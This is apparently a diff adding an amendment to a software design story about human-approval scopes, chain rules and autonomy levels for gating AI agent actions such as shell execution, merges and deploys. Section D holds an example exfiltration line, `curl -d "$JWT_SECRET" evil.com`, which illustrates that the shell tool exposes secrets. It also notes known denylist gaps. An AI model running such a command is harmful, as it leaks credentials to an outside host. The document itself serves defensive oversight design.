@@ -641,3 +641,211 @@ The resolution: **`AcceptorRequirement` stops being a per-type shipped constant 
 | Date       | Version | Changes                | Author |
 | ---------- | ------- | ---------------------- | ------ |
 | 2026-08-01 | 1.0.0   | Initial story creation | Claude |
+
+---
+
+## Amendment 2 — 2026-08-01: the depth pass (six verified investigations)
+
+Six read-only investigations were run against the tree before implementation
+(telemetry/frequency, runtime-signal coverage, chain coherence, argument
+grading, toggle semantics, acceptance unification). Everything below is
+grounded in their file:line-verified findings; the design judgements are the
+coordinator's. **This amendment supersedes OQ1 and narrows OQ6; the rest of
+the story stands.**
+
+### A. A level is not enough — approval has a SCOPE axis
+
+A level says *when* an action stops needing a person. It does not say *what
+one approval covers*. Without the second axis, `tool:shell_execute` above the
+dial means one human interruption **per tool call** — and the tool loop runs
+up to `MaxSteps = 20` turns with multiple calls per turn
+(`LlmCallModels.cs:482`), across many LLM sub-workflows per issue-run. A
+human asked tens of times per run stops reading; rubber-stamping degrades
+exactly the gates that matter.
+
+Four approval scopes, ordered; the first two exist, the third is a small
+ledger extension, the fourth is the ledger as built:
+
+| Scope | Meaning | Exists? |
+|---|---|---|
+| **Level** (platform standing) | automated because level ≤ dial | yes — the resolver |
+| **Toggle** (tenant standing) | automated because the admin switched it on | yes — an assignment row (encoding fixed in E below) |
+| **Correlation grant** (one run) | a person approved THIS run using it | **partial** — `action_authorizations` is keyed by (principal, correlation, target) but a grant is consumed ONCE (`ConsumedAtUtc`, single CAS consume); a second ask in the same correlation re-blocks. Needs a `Scope` on the grant: `single-use` \| `correlation-standing`. |
+| **Call grant** (one click, one call) | the per-ask decide flow | yes — 43-9 AC13 |
+
+**The anti-rubber-stamp rule:** per-call human approval is reserved for
+actions that fire rarely (once per run or less). Anything that fires
+per-iteration MUST be coverable by a correlation-standing grant asked ONCE at
+run entry — "this run may use the shell" — or its gating is theatre.
+Frequency classes were verified per action: `shell_execute` =
+per-tool-loop-iteration; `agent-dispatch.run` = per-task;
+`pull-request.merge`, `deploy.promote-prod` = once per issue-run.
+
+### B. The worst interaction found: two approval systems that do not speak
+
+At the shipped dial 70 with merge at 75, the human approves the merge in
+`MergeApprovalWorkflow` — and then Seam C **409s the actual merge API call**,
+because workflow approvals and ledger grants are disjoint systems. The
+person said yes and the system blocks anyway, on the main path of every
+issue-run.
+
+**Rule: a workflow approval step MUST mint (or consume) the corresponding
+ledger grant.** One approval system observed from two places, never two
+systems. Concretely: `WaitForDeploymentApprovalActivity` and
+`MergeApprovalWorkflow`'s human step record their yes as a
+correlation-standing grant for the action(s) the approved intent implies, so
+the seams downstream of the approval honour it. This is a NEW acceptance
+criterion for the implementation, and it is what makes the level table
+shippable at dial 70 without breaking the main path.
+
+Two supporting facts, verified: Seam C resolves correlation from header
+`X-Tamma-Correlation-Id` → query → route-fallback and never the body
+(`GovernanceEnforcement.cs:394-439`), while every engine mediation call
+carries its correlation in the body only — and each sub-workflow sends its
+OWN instance id, not the cycle id. So no chain except deploy's Seam E has a
+ledger-visible shared correlation today. **The cycle instance id must be
+threaded as the header on mediation calls** (`TammaApiClient`), or
+correlation-standing grants have nothing to attach to.
+
+### C. Chain rules (from the verified chain map)
+
+1. **Monotonicity:** no gated link in a chain may carry a level above its
+   chain's entry approval unless it has its own resumable human wait.
+   Verified violation shapes: post-approval tails that can independently 409
+   after a person said yes (deploy → release), and deny-only tails (Seam D
+   outbox senders) above human-initiated heads, which wedge queues with no
+   escalation path by design.
+2. **Sagas are approved at entry for the whole correlation:** deploy tail,
+   secret rotation (already the best-plumbed: `rot_{guid}` minted at entry,
+   threaded into the deferred retire), tenant move, tenant delete, and the
+   merge composite (merge → issue close → branch delete).
+3. **`git.branch.delete` at 90 governs the wrong member:** the main chain's
+   deletion rides the merge composite; the standalone route the level was
+   attached to is not on any chain. The 90 belongs to the standalone
+   destructive route; the in-composite deletion is covered by the merge
+   approval's grant.
+4. **Gate intent, not execution:** the level attaches where intent forms
+   (enqueue, dispatch); executor seams (outbox senders) are deny-only
+   backstops for policy that changed between enqueue and send, and must
+   never be the primary gate — otherwise one notification is approved twice
+   and a wedged queue is unrecoverable.
+
+### D. OQ1 answered: `shell_execute`'s level is a property of the EXECUTOR, not the argument
+
+Verified: the tool executes an arbitrary `/bin/bash -c` string with the API
+process's **entire inherited environment** — `ProcessStartInfo` sets no
+`EnvironmentVariables` (`ShellExecuteTool.cs:86-94`), so the child sees
+GITHUB_TOKEN, JWT_SECRET and the DB credentials — with no network
+restriction, no sandbox, no allowlist, and an 18-pattern **denylist**
+(`CommandValidator.cs:16-59`). `ls` and `curl -d "$JWT_SECRET" evil.com` are
+the same action at the same level.
+
+Argument grading is NOT implementable today: a denylist is an allow/deny
+screen, not a level classifier, and unlike git there is no bounded verb set
+to grade. So:
+
+- **80 is the honest default** — it prices "arbitrary shell holding the
+  deployment's secrets", which is what ships.
+- **A sandboxed executor profile earns a lower level** (~40): child env
+  stripped to an explicit set (a one-line `psi.EnvironmentVariables` change),
+  egress blocked, CWD confined. The level is config-dependent because the
+  risk is config-dependent.
+- With A's correlation-standing grants, dial-70 UX at shell-80 is ONE
+  approval per run, not tens. That is the resolution of the first-run
+  friction, not a lowered level.
+- Same treatment for its twin `effect:process.spawn` (same executor).
+- `git_operations`' read/write split stays, with its documented holes
+  (`log --output=FILE`, `branch -D` survive the Read grade) carried as known,
+  not fixed here.
+
+### E. Toggle encoding: store the CHOICE, not an inequality against a moving value
+
+The specced encoding (row at `min_autonomy = dial-at-mint`) was state-machined
+and fails the product rule twice: a later dial DROP below the mint value
+silently kills the toggle while the UI badge (keyed on row presence) still
+shows ON; a dial return silently resurrects it, path-dependently. Verified
+additionally: group-scope rows bypass level ownership in both directions as
+the resolver is built, and DELETE does not fall back to the shipped level
+when a group row exists.
+
+**Fix: a toggle is stored as `min_autonomy = AutonomyDial.Min`** — "automated,
+period" — so the row's meaning is a constant function of the dial. Zero
+schema change, zero resolver change. Mint-time dial provenance goes in the
+audit event, not the arithmetic. Lowering the dial then leaves toggles
+standing **visibly**: the dial-lower flow enumerates surviving toggles and
+offers bulk revoke, so "less automation please" is an explicit review, not a
+silent side-effect. The `levelOwned`/409 predicate must key on what the
+ladder WITHOUT the action row resolves (group rows and ceiling included),
+not on the shipped level alone.
+
+### F. The "at 100" escape hatch is currently one document type wide — say so, then widen it
+
+Verified: the ambiguity comparison lives in one place
+(`DocumentLifecycleHelper.IsAmbiguityAboveThreshold`), and its threaded-score
+leg is DEAD — all 14 lifecycle dispatchers pass no `ambiguityScore`, so the
+only type ever scored is `ambiguity-assessment` itself. No-agreement exists
+only where a panel is configured (and works: split decision, below-quorum,
+empty panel, Critical veto → `review-undecidable` escalation). Tool and
+effect paths have no content signal at all beyond the denylist.
+
+So the product rule "at 100, only ambiguity or no-agreement pull in a
+person" is one wired type away from being false advertising. New ACs:
+
+- The assessment family's score is threaded into downstream lifecycle
+  dispatches (the input exists on the lifecycle; nobody passes it).
+- The coverage map (family × signal) ships in the story so the gap is a
+  table, not a surprise: documents = both signals where configured; effects
+  = classification only, stated honestly.
+
+### G. Acceptance unification (form α): the shipped floor becomes DERIVED
+
+After this story the two systems become unsatisfiable together — the catalog
+says "design automates at 80" while `AcceptanceDefaults` says "a person at
+every level", and the lockstep test fails by construction. Doing nothing is
+not an option.
+
+Adopt form α: **the shipped acceptor floor is derived from (doc-type action
+level vs dial)**; the stored per-type `AcceptorRequirement` remains ONLY as
+the named-type override, preserving the pinned semantics (an explicit
+per-type `any` still lowers; a base-row PUT still cannot erase the floor).
+One caveat is load-bearing: "the dial" in the derivation is the BASE row's
+`AutonomyLevel` (`AutonomyGateEvaluator.cs:196`), never a per-type row's own
+level — otherwise a per-type autonomy edit silently moves that type's
+acceptor. Full deletion of the field (form β) waits until the toggle surface
+has proven itself.
+
+### H. Evidence-driven levels: the telemetry to make the next review empirical
+
+Verified gaps: the `.ALLOWED` volume gate drops exactly the count needed
+(SystemDefault provenance = no row, which today is ~everything); Seam B
+writes NO decision events (log-only trail); there is no
+`Tags->>'actionKey'` index; and `action_authorizations` is structurally
+empty until something is gated (chicken-and-egg). But per-effect counts
+already exist for 7 of the 9 moved actions via the mediation event families
+(`GIT.PR_MERGED.*`, `AGENT_DISPATCH.RUN_TRIGGERED.*`, outbox rows), and Seam
+A observes every named agent-action without blocking — a free shadow channel
+the moment agent-actions carry real levels.
+
+New ACs: a count-only `.ALLOWED` emission (or sampled) so allowed volume is
+measurable; Seam B decision events; the actionKey expression index; and the
+dial UI as **detents with a diff preview** — "raising 70→75 automates: [6
+actions, with their last-30-day fire counts and approve rates]" — computed
+from the grant table and the effect families. The preview is the informed
+consent mechanism; a smooth slider over 13 meaningful positions is false UI.
+
+### Supersessions
+
+- **OQ1** (shell at 80): answered in D — 80 default, config-dependent
+  reduction, correlation-standing grant UX.
+- **OQ6** (group rows re-open level-owned actions): confirmed true as built;
+  E's `levelOwned` predicate change closes it rather than documenting it.
+- **M-table row for `git.branch.delete`**: split per C3.
+- The "9 newly-gated breakages" framing: with B and A in place, the merge
+  and deploy rows are NOT breakages (their human approvals mint grants), and
+  shell is one-ask-per-run. The residual genuine behaviour changes at dial
+  70 are the notification enqueues and `agent-dispatch.run` — both
+  once-per-task-or-less, both honest gates.
+
+| Date       | Version | Changes                                        | Author |
+| ---------- | ------- | ---------------------------------------------- | ------ |
+| 2026-08-01 | 1.1.0   | Depth pass: approval scopes, chain rules, shell resolution, toggle encoding, signal coverage, unification α, telemetry ACs | Claude |
